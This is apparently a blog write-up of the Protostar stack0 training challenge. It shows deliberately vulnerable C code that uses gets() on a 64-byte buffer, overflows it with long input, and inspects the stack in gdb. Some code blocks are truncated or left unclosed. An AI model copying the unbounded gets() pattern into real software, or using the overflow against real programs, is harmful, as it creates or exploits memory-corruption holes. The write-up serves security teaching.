Welcome to the first challenge from Protostar series brought to us by [Exploit Exercises](https://exploit-exercises.com/).

### Solution

At first we are given a source code of the challenge.

{% highlight c %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
{% endhighlight %}

As we can see, our goal is to modify the value of `modified` variable, which is for now equal to `0`. But before the declaration of this variable, we have a character buffer 64 elements in size.

Just after these two variables, we have `gets()` function that will copy anything that we enter into the buffer. From `man` pages, we can remeber that this function should not be used.

{% highlight text %}
Never use gets().  Because it is impossible to tell without knowing the  data  in
advance how many characters gets() will read, and because gets() will continue to
store characters past the end of the buffer, it is extremely  dangerous  to  use.
It has been used to break computer security.  Use fgets() instead.
{% endhighlight %}

With that information, let's jump and `ssh` into the the protostar machine.

{% highlight bash %}
> $ ssh user@192.168.0.234

Now let's move into the directory containing challenge binaries.

{% highlight bash %}
$ cd /opt/protostar/bin/
$ ./stack0
asd
Try again?
{% endhighlight %}

Here we can see how the program works in real sitation. It takes the input from the user, and as the `modified` variable was not modified, it prints `Try again?` string. But as we know that the `buffer` can contain only `64` elements, let's print an absurd number of `a` letters passing them into the binary.

{% highlight bash %}
$ ./stack0
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
you have changed the 'modified' variable
Segmentation fault
{% endhighlight %}

And here it is, we modified the `modified` variable. But why did it happen? We can view the binary using tools such as `gdb` in order to see how their internal system works.

{% highlight bash %}
$ gdb ./stack0

Reading symbols from /opt/protostar/bin/stack0...done.
(gdb) set disassembly-flavor intel
{% endhighlight %}

Firstly, we have to set the assembly syntax into the Intel one, as for me it's easier to read. After that we're ready to analyze the assembly code of the `main()` function.

{% highlight bash %}
(gdb) disas main
Dump of assembler code for function main:
0x080483f4 <main+0>:	push   ebp
0x080483f5 <main+1>:	mov    ebp,esp

0x08048433 <main+63>:	leave  
0x08048434 <main+64>:	ret    
End of assembler dump.
{% endhighlight %}

As we know that the buffer is getting overfilled just after the `gets()` function, we can put a breakpoint just after this function at `0x08048411` address. That way, the flow of the program will stop and we will be able to freely look around registers and memory used at that particular moment.

{% highlight bash %}
(gdb) break *0x08048411
Breakpoint 1 at 0x8048411: file stack0/stack0.c, line 13.
(gdb) r
Starting program: /opt/protostar/bin/stack0
aaaaaaaaaaaaaa

Breakpoint 1, main (argc=1, argv=0xbffffd64) at stack0/stack0.c:13
13	stack0/stack0.c: No such file or directory.
	in stack0/stack0.c
{% endhighlight %}

This time, I'm running the binary with small input, such that will not overfill the buffer. That will show you a difference between this run, and run using large input.

Together with the fact that the variables are stored in stack, we will have to view it. In order to do it, we can use this command `x/40x $esp`. Let's analyze it. Letters `x` means that the output will be printed in the hexadecimal format, `40` is the number of elements that we want to print and `$esp` is the name of the register we want to use.

But why `ESP` register? Simply because it stores the address of the most recent value pushed on the stack, which in our case are the variables.

{% highlight bash %}
(gdb) x/40x $esp
  0xbffffc50:	0xbffffc6c	0x00000001	0xb7fff8f8	0xb7f0186e
  0xbffffc60:	0xb7fd7ff4	0xb7ec6165	0xbffffc78	0x61616161

  0xbffffc80:	0xb7ff1040	0x08049620	0xbffffcb8	0x08048469
  0xbffffc90:	0xb7fd8304	0xb7fd7ff4	0x08048450	0xbffffcb8
->0xbffffca0:	0xb7ec6365	0xb7ff1040	0x0804845b	0x00000000
  0xbffffcb0:	0x08048450	0x00000000	0xbffffd38	0xb7eadc76
  0xbffffcc0:	0x00000001	0xbffffd64	0xbffffd6c	0xb7fe1848
  0xbffffcd0:	0xbffffd20	0xffffffff	0xb7ffeff4	0x0804824b
  0xbffffce0:	0x00000001	0xbffffd20	0xb7ff0626	0xb7fffab0
{% endhighlight %}

See the big number of `0x61` digits stored in memory? If we'll take a look at the ASCII chart, we'll know that it's the value of the `a` letters, so that what we enetered. On the other hand, we can also see place where there are only `0x00` values, which will probably mean that that's the place where our `modified` variable is stored.

Now we can run this binary once again, but this time with the input consisting of 65 `a` letters.

{% highlight python %}
>>> print('a' * 65)
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

(gdb) c
Continuing.
you have changed the 'modified' variable

Program exited with code 051.
{% endhighlight%}

Here we can see that the place where `0x00` values were, now is overwritten with single `0x61` value, and since that we know it's modified. Doing this changed the flow of the program, resulting in our success.
